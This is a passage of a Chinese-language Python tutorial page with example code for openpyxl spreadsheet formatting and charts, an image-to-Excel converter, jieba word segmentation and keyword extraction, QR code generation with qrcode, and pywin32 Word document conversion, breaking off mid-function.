wb = load_workbook('e:\\sample.xlsx')
ws1=wb.active
ws1["A1"]=1
ws1["A2"]=2
ws1["A3"]=3
ws1["A4"] = "=SUM(1, 1)"
ws1["A5"] = "=SUM(A1:A3)"
print ws1["A4"].value  #打印的是公式内容,不是公式计算后的值,程序无法取到计算后的值
print ws1["A5"].value  #打印的是公式内容,不是公式计算后的值,程序无法取到计算后的值
wb.save("e:\\sample.xlsx")

### 合并单元格
from openpyxl import Workbook
from openpyxl import load_workbook
wb = load_workbook('e:\\sample.xlsx')
ws1=wb.active
ws.merge_cells('A2:D2')
ws.unmerge_cells('A2:D2')  #合并后的单元格,脚本单独执行拆分操作会报错,需要重新执行合并操作再拆分
# or equivalently
ws.merge_cells(start_row=2,start_column=1,end_row=2,end_column=4)
ws.unmerge_cells(start_row=2,start_column=1,end_row=2,end_column=4)
wb.save("e:\\sample.xlsx")

### 插入一个图片,需要先安装Pilow,安全文件是：PIL-fork-1.1.7.win-amd64-py2.7.exe
from openpyxl import load_workbook
from openpyxl.drawing.image import Image
wb = load_workbook('e:\\sample.xlsx')
ws1=wb.active
img = Image('e:\\1.png')
ws1.add_image(img, 'A1')
wb.save("e:\\sample.xlsx")

### 隐藏单元格
from openpyxl import load_workbook
from openpyxl.drawing.image import Image
wb = load_workbook('e:\\sample.xlsx')
ws1=wb.active
ws1.column_dimensions.group('A', 'D', hidden=True)   #隐藏a到d列范围内的列
#ws1.row_dimensions 无group方法
# Save the file
wb.save("e:\\sample.xlsx")

### 画一个柱状图
from openpyxl import load_workbook
from openpyxl import Workbook
from openpyxl.chart import BarChart, Reference, Series
wb = load_workbook('e:\\sample.xlsx')
ws1=wb.active
wb = Workbook()
ws = wb.active
for i in range(10): ws.append([i])
values = Reference(ws, min_col=1, min_row=1, max_col=1, max_row=10)
chart = BarChart()
chart.add_data(values)
ws.add_chart(chart, "E15")
wb.save("e:\\sample.xlsx")

### 画一个饼图
from openpyxl import load_workbook
from openpyxl import Workbook
from openpyxl.chart import (PieChart , ProjectedPieChart, Reference)
from openpyxl.chart.series import DataPoint

data = [
    ['Pie', 'Sold'],
    ['Apple', 50],
    ['Cherry', 30],
    ['Pumpkin', 10],
    ['Chocolate', 40],
]

wb = Workbook()
ws = wb.active

for row in data:
    ws.append(row)

pie = PieChart()
labels = Reference(ws, min_col=1, min_row=2, max_row=5)
data = Reference(ws, min_col=2, min_row=1, max_row=5)
pie.add_data(data, titles_from_data=True)
pie.set_categories(labels)
pie.title = "Pies sold by category"

# Cut the first slice out of the pie
slice = DataPoint(idx=0, explosion=20)
pie.series[0].data_points = [slice]

ws.add_chart(pie, "D1")

ws = wb.create_sheet(title="Projection")

data = [
    ['Page', 'Views'],
    ['Search', 95],
    ['Products', 4],
    ['Offers', 0.5],
    ['Sales', 0.5],
]

for row in data:
    ws.append(row)

projected_pie = ProjectedPieChart()
projected_pie.type = "pie"
projected_pie.splitType = "val" # split by value
labels = Reference(ws, min_col=1, min_row=2, max_row=5)
data = Reference(ws, min_col=2, min_row=1, max_row=5)
projected_pie.add_data(data, titles_from_data=True)
projected_pie.set_categories(labels)

ws.add_chart(projected_pie, "A10")

from copy import deepcopy
projected_bar = deepcopy(projected_pie)
projected_bar.type = "bar"
projected_bar.splitType = 'pos' # split by position

ws.add_chart(projected_bar, "A27")

wb.save("e:\\sample.xlsx")

### 设定一个表格区域,并设定表格的格式
from openpyxl import load_workbook
from openpyxl import Workbook
from openpyxl.worksheet.table import Table, TableStyleInfo

wb = Workbook()
ws = wb.active

data = [
    ['Apples', 10000, 5000, 8000, 6000],
    ['Pears',   2000, 3000, 4000, 5000],
    ['Bananas', 6000, 6000, 6500, 6000],
    ['Oranges',  500,  300,  200,  700],
]

# add column headings. NB. these must be strings
ws.append(["Fruit", "2011", "2012", "2013", "2014"])
for row in data:
    ws.append(row)

tab = Table(displayName="Table1", ref="A1:E5")

# Add a default style with striped rows and banded columns
style = TableStyleInfo(name="TableStyleMedium9", showFirstColumn=True,
                       showLastColumn=True, showRowStripes=True, showColumnStripes=True)
#第一列是否和样式第一行颜色一行,第二列是否···
#是否隔行换色,是否隔列换色
tab.tableStyleInfo = style
ws.add_table(tab)

wb.save("e:\\sample.xlsx")

### 给单元格设定字体颜色
from openpyxl import Workbook
from openpyxl.styles import colors
from openpyxl.styles import Font

wb = Workbook()
ws = wb.active

a1 = ws['A1']
d4 = ws['D4']
ft = Font(color=colors.RED)  # color="FFBB00",颜色编码也可以设定颜色
a1.font = ft
d4.font = ft

# If you want to change the color of a Font, you need to reassign it::
#italic 倾斜字体
a1.font = Font(color=colors.RED, italic=True) # the change only affects A1
a1.value = "abc"

# Save the file
wb.save("e:\\sample.xlsx")

### 设定字体和大小
from openpyxl import Workbook
from openpyxl.styles import colors
from openpyxl.styles import Font

wb = Workbook()
ws = wb.active

a1 = ws['A1']
d4 = ws['D4']
a1.value = "abc"

from openpyxl.styles import Font
from copy import copy

ft1 = Font(name=u'宋体', size=14)
ft2 = copy(ft1)   #复制字体对象
ft2.name = "Tahoma"

print ft1.name
print ft2.name
print ft2.size # copied from the

a1.font = ft1
# Save the file
wb.save("e:\\sample.xlsx")

### 设定行和列的字体
from openpyxl import Workbook
from openpyxl.styles import Font
wb = Workbook()
ws = wb.active

col = ws.column_dimensions['A']
col.font = Font(bold=True)   #将A列设定为粗体
row = ws.row_dimensions[1]
row.font = Font(underline="single")  #将第一行设定为下划线格式

# Save the file
wb.save("e:\\sample.xlsx")

### 设定单元格的边框、字体、颜色、大小和边框背景色
from openpyxl import Workbook
from openpyxl.styles import Font
from openpyxl.styles import NamedStyle, Font, Border, Side,PatternFill

wb = Workbook()
ws = wb.active

highlight = NamedStyle(name="highlight")
highlight.font = Font(bold=True, size=20,color= "ff0100")
highlight.fill = PatternFill("solid", fgColor="DDDDDD")#背景填充
bd = Side(style='thick', color="000000")
highlight.border = Border(left=bd, top=bd, right=bd, bottom=bd)

print dir(ws["A1"])
ws["A1"].style =highlight

# Save the file
wb.save("e:\\sample.xlsx")

### 常用的样式和属性设置
from openpyxl import Workbook
from openpyxl.styles import Font
from openpyxl.styles import NamedStyle, Font, Border, Side,PatternFill
from openpyxl.styles import PatternFill, Border, Side, Alignment, Protection, Font

wb = Workbook()
ws = wb.active

ft = Font(name=u'微软雅黑',
    size=11,
    bold=False,
    italic=False,
    vertAlign=None,
    underline='none',
    strike=False,
    color='FF000000')

fill = PatternFill(fill_type="solid",
    start_color='FFEEFFFF',
    end_color='FF001100')

#边框可以选择的值为：'hair', 'medium', 'dashDot', 'dotted', 'mediumDashDot', 'dashed', 'mediumDashed', 'mediumDashDotDot', 'dashDotDot', 'slantDashDot', 'double', 'thick', 'thin']
#diagonal 表示对角线
bd = Border(left=Side(border_style="thin",
              color='FF001000'),
    right=Side(border_style="thin",
               color='FF110000'),
    top=Side(border_style="thin",
             color='FF110000'),
    bottom=Side(border_style="thin",
                color='FF110000'),
    diagonal=Side(border_style=None,
                  color='FF000000'),
    diagonal_direction=0,
    outline=Side(border_style=None,
                 color='FF000000'),
    vertical=Side(border_style=None,
                  color='FF000000'),
    horizontal=Side(border_style=None,
                   color='FF110000')
                )

alignment=Alignment(horizontal='general',
        vertical='bottom',
        text_rotation=0,
        wrap_text=False,
        shrink_to_fit=False,
        indent=0)

number_format = 'General'

protection = Protection(locked=True,
            hidden=False)

ws["B5"].font = ft
ws["B5"].fill =fill
ws["B5"].border = bd
ws["B5"].alignment = alignment
ws["B5"].number_format = number_format

ws["B5"].value ="zeke"

# Save the file
wb.save("e:\\sample.xlsx")

</textarea>图片转Execl工具<textarea>
# 原理是打开一幅图片,先对图片进行格式转换个缩放,然后依次读取图片每个像素的RGB值,然后把该值作为Excel表格中对应单元格的背景色.最后再把每个单元格设置为高度与宽度相等的小正方形

from openpyxl.workbook import Workbook         # 导入Workbook库用与操作Execl工作簿
from openpyxl.styles import PatternFill, Color # 导入PatternFill,Color库用与操作Execl单元格
from PIL import Image                          # 导入Image库用与操作图片文件
import datetime

# 把一个整数值转换成26进制字符串,因为execl单元格的行坐标是26进制的, 比如"A", "Z", "AA", "AZ"
def dec_to_base26(d):
    s = ""
    m = 0
    while d > 0:
        m = d % 26
        if m == 0:
            m = 26
        s = "{0:c}{1:s}".format(m+64, s)
        d = (d - m) // 26
    return s

# 把一个26进制字符串转换成整数值
def base26_to_dec(s):
    d = 0
    j = 1
    st = s.upper()
    for x in range(0, len(st))[::-1]:
        c = ord(st[x])
        if c < 65 and c > 90:
            return 0
        d += (c - 64) * j
        j *= 26
    return d

# 把一个整数坐标转换成Execl坐标,Execl坐标的行坐标是26进制的, 列坐标是10进制的,比如(AA, 100)
def decxy_to_excelxy(x, y):
    return("{0:s}{1:d}".format(dec_to_base26(x), y))

# 把像素点的rgb值转换成Execl支持的十六进制字符串, 形如 "AARRGGBB",其中AA表示透明度,这里设置为0, 比如 "00FF55FF"
def pixel_to_xrgbstr(pix):
    return ("00{0:02X}{1:02X}{2:02X}".format(pix[0], pix[1], pix[2]))

# 图片转Execl函数, imgName表示带全路径的图片名
def image_to_excel(imgName):
    wb = Workbook() #创建一个 excel 工作簿
    ws = wb.active
    try:
        img = Image.open(imgName)  # 打开图片文件文件
    except:
        print("Error to Open [{0}]!!!".format(imgName))
    # 判断图片文件的格式, 如果不是"RGB"格式则用convert函数转换成"RGB"格式.
    if "RGB" == img.mode:
        print("Size{0},Format({1}),Color({2})".format(img.size, img.format, img.mode))
    else:
        print("Not a RGB image file!!!")
        img = img.convert("RGB")
        print("Convert to RGB Success!!!")

    width, height = img.size[0], img.size[1] #获取图片文件宽和高
    zoom = 0
    maxsize = max(width, height) #如果图片文件大于400*400像素,则对图片进行缩放,缩放比例依照宽度和高度中的最大值
    if maxsize >= 400:
        zoom = maxsize / 400
        width = int(width / zoom)
        height = int(height / zoom)
        img = img.resize((width, height))
        print("Image Size too large, Resize to", img.size)
    index = 0
    print("Start Process!")
    for w in range(width):  # 遍历图片的宽度,[0, width)
        index += 1          # 显示处理进度
        print("#", end="")
        if index >= 60:     # 大于60换行
            index = 0
            print("")
        for h in range(height):               # 遍历图片的高度[0, height)
            pixel = img.getpixel((w, h))      # 获取图片当前坐标点的像素值
            loc = decxy_to_excelxy(w+1, h+1)  # 把整数坐标转换成Execl坐标(字符串)
            c = ws[loc]                       # 选中当前图片像素点坐标对应的Execl单元格
            col = pixel_to_xrgbstr(pixel)     # 把当前图片像素点的颜色转换成Execl单元格的颜色(字符串)
            cfill = PatternFill(fill_type="solid", start_color=col)  # 用当前图片像素点的颜色填充单元格底色
            c.fill = cfill
            ws.column_dimensions[dec_to_base26(w+1)].width = 1 # 把单元格的宽设置为1,高设置为6, 这样单元格看上去就是一个(小)正方形
            ws.row_dimensions[h+1].height = 6
    print("\nProcess Done!")
    timestr = datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S") # 获取当前时间,转换成字符串
    namestr = "{0}-{1}.xlsx".format(imgName, timestr) # 生成的Execl文件名用<原图片文件名+ 当前时间字符串+ "..xlsx"后缀>作为文件名
    print("Save File As [{0}]".format(namestr))
    wb.save(namestr)  # 保存新生成的Execl文件
    print("Save Done!")
name = input("Please Input Image File Name:")
print("Start......")
try:
    image_to_excel(name)
except:
    print("Error!!!!!!")
print("Over......")

</textarea>
</div>

<div id="jieba">
<h4>jieba分词 文本分析 自然语言处理之中文分词器</h4><pre>
pip3 install jieba

jieba分词算法使用了基于前缀词典实现高效的词图扫描,生成句子中汉字所有可能生成词情况所构成的有向无环图(DAG), 再采用了动态规划查找最大概率路径,找出基于词频的最大切分组合,对于未登录词,采用了基于汉字成词能力的HMM模型,使用了Viterbi算法

jieba分词的原理
Jieba分词依靠中文词库
- 利用一个中文词库,确定汉字之间的关联概率
- 汉字间概率大的组成词组,形成分词结果
- 除了分词,用户还可以添加自定义的词组

结巴分词的核心算法：基于前缀词典、动态规划、隐马模型

jieba分词支持三种分词模式：
1. 精确模式, 试图将句子最精确地切开,不存在冗余单词,适合文本分析：
2. 全模式,把句子中所有的可以成词的词语都扫描出来,速度非常快,存在冗余单词,但是不能解决歧义;
3. 搜索引擎模式,在精确模式的基础上,对长词再词切分,提高召回率,适合用于搜索引擎分词。

jieba.cut
该方法接受三个输入参数：
参数1：需要分词的字符串;
参数2：cut_all参数默认False为精确模式,True为全模式
参数3：HMM参数用来控制是否适用HMM模型
返回生成器

jieba.cut_for_search
该方法接受两个参数：
参数1：需要分词的字符串;
参数2：是否使用HMM模型,
该方法适用于搜索引擎构建倒排索引的分词,粒度比较细。
返回生成器

jieb.lcut 以及 jieba.lcut_for_search
直接返回list

jieba.add_word(w)
向分词词典中添加新词w

jieba.Tokenizer(dictionary=DEFUALT_DICT)
新建自定义分词器,可用于同时使用不同字典,jieba.dt为默认分词器,所有全局分词相关函数都是该分词器的映射

</pre><textarea>
>>> import jieba
>>> text='赵丽颖主演的正午阳光剧,知否知否应是绿肥红瘦'

>>> seq_list=jieba.cut(text,cut_all=True)
>>> seq_list
< generator object Tokenizer.cut at 0x000001B7B004B348>
>>> list(seq_list)
Building prefix dict from the default dictionary ...
Dumping model to file cache C:\Users\lenovo\AppData\Local\Temp\jieba.cache
Loading model cost 1.682 seconds.
Prefix dict has been built succesfully.
['赵', '丽', '颖', '主演', '的', '正午', '阳光', '剧', '', '', '知', '否', '知', '否', '应', '是', '绿肥', '绿肥红瘦']

>>> seq_list=jieba.cut(text)
>>> seq_list
< generator object Tokenizer.cut at 0x000001B7B004B5C8>
>>> list(seq_list)
['赵丽颖', '主演', '的', '正午', '阳光', '剧', ',', '知否', '知否', '应', '是', '绿肥红瘦']

>>> seq_list = jieba.cut_for_search(text)
>>> seq_list
< generator object Tokenizer.cut_for_search at 0x000001B7B004B348>
>>> list(seq_list)
['赵丽颖', '主演', '的', '正午', '阳光', '剧', ',', '知否', '知否', '应', '是', '绿肥', '绿肥红瘦']

</textarea>自定义分词器(jieba.Tokenizer)添加自定义词典,调整词典<textarea>
>>> text='赵丽颖主演的正午阳光剧'
>>> jieba.lcut(text)         # ['赵丽颖', '主演', '的', '正午', '阳光', '剧']
>>> jieba.add_word('阳光剧')
>>> jieba.lcut(text)         # ['赵丽颖', '主演', '的', '正午', '阳光剧']

>>> text='赵丽颖主演的正午阳光剧'
>>> jieba.lcut(text)         # ['赵丽颖', '主演', '的', '正午', '阳光', '剧']
>>> jieba.suggest_freq('阳光剧', True) # 1
>>> jieba.lcut(text)         # ['赵丽颖', '主演', '的', '正午', '阳光剧']
>>> text = '如果放到数据库中将出错'
>>> jieba.lcut(text)         # ['如果', '放到', '数据库', '中将', '出错']
>>> jieba.suggest_freq(('中', '将'), True) # 494
>>> jieba.lcut(text)         # ['如果', '放到', '数据库', '中', '将', '出错']

创建词典内容的格式,一个词语占一行(分三部分),格式: 词语、词频(可选)、词性(可选,如n代表名词,v代表动词)
张三 5
李四 10 eng
赵丽颖 10
知否 150
绿肥红瘦 8
主演 5
阳光剧 3

>>> jieba.load_userdict('jieba_dict.txt') # 自定义词典的导入
>>> jieba.lcut(text)
['赵丽颖', '主演', '的', '正午', '阳光剧', ',', '知否', '知否', '应是', '绿肥红瘦']

# user_dict.txt
< !-- 注释 -->
慕课网 3 n
很高兴 vd

>>> text = '今天很高兴在慕课网和大家一起学习'
>>> jieba.lcut(text)  # ['今天', '很', '高兴', '在', '慕课', '网', '和', '大家', '一起', '学习']
>>> sys.path.append('./')
>>> jieba.load_userdict('./user_dict.txt')
>>> jieba.lcut(text)  # ['今天', '很高兴', '在', '慕课网', '和', '大家', '一起', '学习']

</textarea><pre>
利用jieba进行关键词提取、关键词摘取算法和分词算法：
普通分词：需要手工过滤停用词、无意义词、电话号码、符号等,但能较为全面的保留所有关键字。
基于TF-IDF算法的关键词抽取：停用词过滤有限,也需要手工处理部分数字、符号;它通过词频抽取关键字,对同一篇文章的词频统计不具有统计意义,多用于宏观上的观测。
基于TextRank算法的关键词抽取: 大概效果同TF-IDF,通过限定词性过滤无关字符,能得到较为工整的关键字结果

应根据目标去选择适当的分词方法
对某一篇文章进行关键字Map,选择普通分词,并自行过滤关键词或添加自定义词库。
对采集的一批样本进行关键字分析可以选择TF-IDF,对所有的关键字进行词频统计,并绘制出关键字云图。
如果要分析一批样本中用户的分类,用户的行为,用户的目的,可以选择TextRank抽取指定词性的关键字进行统计分析。

jieba.analyse.extract_tags(text,topK=20,withWeight=False,allowPOS=())
text:为待提取的文本;
topK:提取几个TF/IDF权重最大的关键字,默认值为20;
withWeight:是否一并返回关键词权重值,默认False;
allowPOS:仅包括指定词性的词,默认为空即不筛选

jieba.analyse.textrank(sentence, topK=20, withWeight=False, allowPOS=('ns', 'n', 'vn', 'v'), withFlag=False)
文本排名,直接使用,接口相同,注意默认过滤词性

jieba.analyse.TFIDF(idf_path=None)
新建tf-idf实例,idf_path为IDF实例

</pre><textarea>
>>> text = '''
新华社华盛顿11月3日电 2019-2020赛季短道速滑世界杯盐湖城站3日进入最后一个比赛日,奥运会冠军武大靖在男子500米第二次比赛中夺冠,中国女子接力队在3000米接力中摘金,中国队以2金3银2铜的总成绩结束本站世界杯。

男子500米第二次比赛决赛在武大靖、匈牙利选手刘少林、韩国选手金东旭和哈萨克斯坦选手阿知加里耶夫之间展开。武大靖曾在上赛季本站比赛中以破世界纪录的成绩夺冠,当日他在比赛中延续王者霸气,从一道出发后将领先优势保持到终点,最终以39秒702夺冠,为中国队摘得本站世界杯的首枚金牌。

女子3000米接力决赛中,由范可新、韩雨桐、曲春雨、张雨婷组成的中国队战胜韩国、加拿大和荷兰队,获得冠军。中韩两队在前半程一直占据前两位,还剩9圈时,韩国队从外道超越中国队,3圈后张雨婷在交接棒前从内道完成反超,中国队将领先优势保持到终点,以4分08秒746摘得金牌。

除了2枚金牌,中国队在当日的比赛中还收获2枚银牌和1枚铜牌。女子500米第二次比赛中,加拿大选手布廷夺得冠军,曲春雨获得银牌;女子1000米决赛中,韩雨桐和张楚桐分列二、三名,冠军被荷兰选手舒尔廷收入囊中。

当日还进行了男子1000米决赛,韩国选手黄大宪夺冠,中国队韩天宇排名第四,任子威排名第六。在男子5000米接力比赛中,俄罗斯队获得冠军,中国队在B组决赛中被判犯规。(完)
'''
>>> import jieba.analyse
>>> jieba.analyse.extract_tags(text, 5, withWeight=True)
[('中国队', 0.4259888519306077), ('选手', 0.2860003787870718), ('比赛', 0.26427350620574586), ('决赛', 0.2579096536052486), ('夺冠', 0.22862606829834256)]
>>> jieba.analyse.textrank(text, 5, withWeight=True)
[('选手', 1.0), ('比赛', 0.9245699529497209), ('女子', 0.6951067334867929), ('冠军', 0.5833077706363218), ('决赛', 0.5426789594267437)]

</textarea>词性标注,用于提取人名、地名等<textarea>
>>> [(word, flag) for word, flag in jieba.posseg.cut('我爱北京天安门')]
[('我', 'r'), ('爱', 'v'), ('北京', 'ns'), ('天安门', 'ns')]

# 命名实体(人名、地名、机构名)提取
>>> [(word, flag) for word, flag in jieba.posseg.cut('我爱北京天安门') if flag in ['nr','ns','nt','nz']]
[('北京', 'ns'), ('天安门', 'ns')]

</textarea>返回词语在原文的起止位置<textarea>
>>> list(jieba.tokenize('永和服装饰品有限公司'))
[('永和', 0, 2), ('服装', 2, 4), ('饰品', 4, 6), ('有限公司', 6, 10)]
>>> list(jieba.tokenize('永和服装饰品有限公司', mode='saerch'))
[('永和', 0, 2), ('服装', 2, 4), ('饰品', 4, 6), ('有限', 6, 8), ('公司', 8, 10), ('有限公司', 6, 10)]

</textarea><pre>
自定义去停用词stopwords
根据词性规则构建自定义停用词

三种空格unicode(\u00A0,\u0020,\u3000)表示的区别
1.不间断空格\u00A0,主要用在office中,让一个单词在结尾处不会换行显示,快捷键ctrl+shift+space
2.半角空格(英文符号)\u0020,代码中常用的;
3.全角空格(中文符号)\u3000,中文文章中使用;

str.replace(u'\xa0', u' ')  # \xa0 是不间断空白符
str.replace(u'\u3000',u' ') # \u3000 是全角的空白符
title.strip('\r\n').replace(u'\u3000', u' ').replace(u'\xa0', u' ')
content.strip("").strip('\r\n').replace(u'\u3000', u' ').replace(u'\xa0', u' ')

</pre><textarea>
import re, jieba
from collections import Counter

# 正则对字符串清洗
def textParse(str_doc):
    # 正则过滤掉特殊符号、标点、英文、数字等。
    r = '[a-zA-Z0-9’!"#$%&\'()*+,-./:：;;|<=>?@,—。?★、…【】《》？“”‘’！[\\]^_`{|}~]+'
    str_doc = re.sub(r, ' ', str_doc)      # 去除换行符
    str_doc = re.sub('\s+', ' ', str_doc)  # 多个空格成1个
    str_doc = str_doc.replace('\n',' ')    # 去除换行符
    return str_doc

# 去掉一些停用词和数字、单个字符、空格
def rm_tokens(words_list, stwlist):
    return [word for word in words_list if word not in stwlist and not word.isdigit() and len(word) != 1 and word != ' ']

# 利用jieba对文本进行分词,返回切词后的list
def seq_doc(str_doc):
    sent_list = map(textParse, str_doc.split('\n'))
    # 创建并获取停用词列表,NLPIR_stopwords.txt,网上可以下载到
    # stwlist = open('NLPIR_stopwords.txt', 'r', encoding='utf8').read()
    stwlist = '''
!
#
$
万一
三天两头
不仅
不仅仅
只要
重要
同时
正在
'''
    stwlist = set(stwlist.split('\n'))
    word_2dlist = [rm_tokens(jieba.lcut(part), stwlist) for part in sent_list]  # 分词并去除停用词
    word_list = sum(word_2dlist, [])  # 合并列表
    return word_list

if __name__ == '__main__':
    import requests
    from lxml import etree
    text = requests.get('http://baijiahao.baidu.com/s?id=1649239865802332584').text
    html = etree.HTML(text)
    target = html.xpath('//*[@id="left-container"]/div[1]//text()')
    target = '\n'.join(target)
    r = seq_doc(target)

    # 词频统计,高频词,低频词
    words = Counter(r).most_common(20)
    wlist = [w for w in words if w[1] > 5]
    print(wlist)

</textarea>jieba结合pandas分析文本<textarea>
import numpy as np
import pandas as pd
import jieba
import jieba.analyse
import codecs

#设置pd的显示长度,默认pd显示的文本长度为50,超出部分显示为省略号
pd.set_option('max_colwidth',500)

#载入数据,将所有列设置为string,编码指定utf-8,第一行为列头,column name: id, title, content
rows=pd.read_csv('datas1.csv', header=0,encoding='utf-8',dtype=str)

# 对于普通分词,需要将停用词载入到一个数组中,在分词后逐一比较关键词是否为停用词
stopwords = [line.strip() for line in codecs.open('stoped.txt', 'r', 'utf-8').readlines()]

# 对于TF-IDF,只需要告诉组件停用词库,它将自己载入停用词库并使用它
jieba.analyse.set_stop_words('stoped.txt')

# 接下来对所有文章进行分词,先声明一个数组,用于全局保存分词后的关键字,此数组每行保存一个关键字对象,用于词频统计
# 关键字对象有两个属性：word关键字本身,count永远为1,用于后面统计词频
segments = []

# 普通分词及停用词判断
for index, row in rows.iterrows():
    content = row[2]
    words = jieba.cut(content)
    splitedStr = ''
    for word in words:
        if word not in stopwords:  # 停用词判断,如果当前的关键词不在停用词库中才进行记录
            segments.append({'word':word, 'count':1})  # 记录全局分词
            splitedStr += word + ' '

# Text Rank 关键词抽取,只获取固定词性
for index, row in rows.iterrows():
    content = row[2]
    words = jieba.analyse.textrank(content, topK=20,withWeight=False,allowPOS=('ns', 'n', 'vn', 'v'))
    splitedStr = ''
    for word in words:
        segments.append({'word':word, 'count':1})  # 记录全局分词
        splitedStr += word + ' '

dfSg = pd.DataFrame(segments)                   # 将结果数组转为df序列
dfWord = dfSg.groupby('word')['count'].sum()    # 词频统计
dfWord.to_csv('keywords.csv',encoding='utf-8')  # 导出csv

</textarea><pre>
用jieba分词提取关键词做词云
生成词云最关键的问题是中文分词,统计分析各个词的权重,权重较高的字体显示较大,只需要import jieba.analyse,使用jieba.analyse.extract_tags(sentence, topK=20, withWeight=False, allowPOS=())方法即可,有些没有意义的常用词诸如“我的”、“或者”、“一个”等词会出现在结果里面,还需要一个“停用词表”来过滤结果。
目标是提取关键词,并得到“关键词+制表符+权重”的文本,这里关键词和权重用制表符隔开是为了能顺利导入权重的值,决定词的大小(size)

</pre>将输出结果填入https://wordart.com/即可<textarea>
import jieba.analyse

path = '你的txt文件路径'
file_in = open(path, 'r')
content = file_in.read()

try:
    jieba.analyse.set_stop_words('你的停用词表路径')
    tags = jieba.analyse.extract_tags(content, topK=100, withWeight=True)
    for v, n in tags:
        print v + '\t' + str(int(n * 10000))  # 权重是小数,为了凑整,乘了一万
finally:
    file_in.close()

</textarea>利用jieba库统计三国演义中任务的出场次数<textarea>
import  jieba

txt = open("D:\\三国演义.txt", "r", encoding='utf-8').read()
words = jieba.lcut(txt)     # 使用精确模式对文本进行分词
counts = {}     # 通过键值对的形式存储词语及其出现的次数

for word in words:
    if  len(word) == 1:    # 单个词语不计算在内
        continue
    else:
        counts[word] = counts.get(word, 0) + 1    # 遍历所有词语,每出现一次其对应的值加 1

items = list(counts.items())#将键值对转换成列表
items.sort(key=lambda x: x[1], reverse=True)    # 根据词语出现的次数进行从大到小排序

for i in range(15):
    word, count = items[i]
    print("{0:<5}{1:>5}".format(word, count))

</textarea>
</div>

<div id="qrcode">
<h4>qrcode</h4><pre>
pip install qrcode

</pre><textarea>
import qrcode # 模块导入
img = qrcode.make('http://www.baidu.com')  # 调用qrcode的make()方法传入url或者想要展示的内容,获取im对象

# 写入文件方式一
img.save("test.png")

# 写入文件方式二
with open('test.png', 'wb') as f:
    img.save(f)

</textarea><pre>
正常生成二维码的步骤：
1、创建QRCode对象
2、add_data()添加数据
3、make_image()创建二维码(返回im类型的图片对象)
4、自动打开图片,im.show()

QRCode参数详细说明：
version: 一个整数,范围为1到40,表示二维码的大小(最小值是1,是个12×12的矩阵),如果想让程序自动生成,将值设置为None并使用fit=True 参数即可。
error_correction: 二维码的纠错范围,可以选择4个常量：
1.ERROR_CORRECT_L 7%以下的错误会被纠正
2.ERROR_CORRECT_M (default) 15%以下的错误会被纠正
3.ERROR_CORRECT_Q 25 %以下的错误会被纠正
4.ERROR_CORRECT_H. 30%以下的错误会被纠正
boxsize: 每个点(方块)中的像素个数
border: 二维码距图像外围边框距离,默认为4,而且相关规定最小为4

</pre>参数配置后生成自定制二维码<textarea>
import qrcode

data = 'http://www.baidu.com/'
img_file = r'保存路径'
qr = qrcode.QRCode(version=1,error_correction=qrcode.constants.ERROR_CORRECT_H,box_size=10,border=4)  # 实例化QRCode生成qr对象
qr.add_data(data)  # 传入数据
qr.make(fit=True)
img = qr.make_image() # 生成二维码
img.save(img_file)    # 保存二维码
img.show()            # 展示二维码

</textarea>二维码中间都有一张图片或者用户头像<textarea>
# 利用PIL库中image模块的paste函数img.paste(path,where,mask=None),img为image对象;path为所添加图片;where为tuple,如：(x,y),表示图片所在二维码的横纵坐标

import qrcode
from PIL import Image
import matplotlib.pyplot as plt

def getQRcode(data, file_name):
    qr = qrcode.QRCode(version=1,error_correction=qrcode.constants.ERROR_CORRECT_H,box_size=5,border=4,)
    qr.add_data(data)  # 添加数据
    qr.make(fit=True)  # 填充数据
    img = qr.make_image(fill_color="green", back_color="white")  # 生成图片
    icon = Image.open("1.jpg")  # 添加logo,打开logo照片
    img_w, img_h = img.size     # 获取图片的宽高
    factor = 6                  # 设置logo的大小
    size_w = int(img_w / factor)
    size_h = int(img_h / factor)
    icon_w, icon_h = icon.size
    if icon_w > size_w: icon_w = size_w
    if icon_h > size_h: icon_h = size_h
    icon = icon.resize((icon_w, icon_h), Image.ANTIALIAS)  # 重新设置logo的尺寸
    w = int((img_w - icon_w) / 2)  # 得到画图的x,y坐标,居中显示
    h = int((img_h - icon_h) / 2)
    img.paste(icon, (w, h), mask=None) # 黏贴logo照
    plt.imshow(img)      # 终端显示图片
    plt.show()
    img.save(file_name)  # 保存img
    return img

if __name__ == '__main__':
    getQRcode("世情薄,人情恶,雨送黄昏花易落。晓风干,泪痕残,欲笺心事,独语斜阑。"
              "难,难,难！人成各,今非昨,病魂常似秋千索。角声寒,夜阑珊,怕人寻问,咽泪装欢。瞒,瞒,瞒！", 'my.png')

</textarea>

<div id="pywin32">
<h4>pywin32 windows系统</h4><pre>
pywin32：python操作windows底层的库,主要是对vb的封装,可实现操作word、pdf、ppt、xls文档
它直接包装了几乎所有的Windows API,可以方便地从Python直接调用,该模块另一大主要功能是通过Python进行COM编程

</pre>windows提示框<textarea>
import win32api
import win32con
win32api.MessageBox(None,"Hello,pywin32!","pywin32",win32con.MB_OK)

</textarea>word另存为html文件<textarea>
import win32com
import win32com.client

wordapp = win32com.client.gencache.EnsureDispatch("Word.Application")
try:
    wordapp.Documents.Open('11.doc')
    wordapp.ActiveDocument.SaveAs('11.html', FileFormat=win32com.client.constants.wdFormatFilteredHTML)
    wordapp.ActiveDocument.Close()
finally:
    wordapp.Quit()

</textarea>word批量转换为pdf<textarea>
import os
from win32com.client import Dispatch, constants, gencache

def word2pdf(wordfile, pdffile):
    word = gencache.EnsureDispatch('Word.Application')
    doc = word.Documents.Open(wordfile, ReadOnly = 1)
    doc.ExportAsFixedFormat(
        pdffile,
        constants.wdExportFormatPDF,
        Item=constants.wdExportDocumentWithMarkup,
        CreateBookmarks=constants.wdExportCreateHeadingBookmarks
    )
    word.Quit(constants.wdDoNotSaveChanges)

target = "C:\\Users\\lenovo\\Desktop"
wordfiles = [fn for fn in os.listdir(target) if fn.endswith(('.doc', '.docx'))]
for wordfile in wordfiles:
    wordfile = os.path.abspath(os.path.join(target, wordfile))
    index = wordfile.rindex('.')
    pdffile = wordfile[:index] + '.pdf'
    word2pdf(wordfile, pdffile)

</textarea>doc文件转换成文本文件<textarea>
from win32com.client import constants, Dispatch
import pythoncom
import glob
import os
from zipfile import ZipFile

def convert_to_text(wordapp, wordfile):
    name, ext = os.path.splitext(wordfile)
    if ext != '.doc' and ext != '.docx': return
    txtfile = name + '.txt'
    wordapp.Documents.Open(os.path.abspath(wordfile))
    wdFormatTextLineBreaks = 3
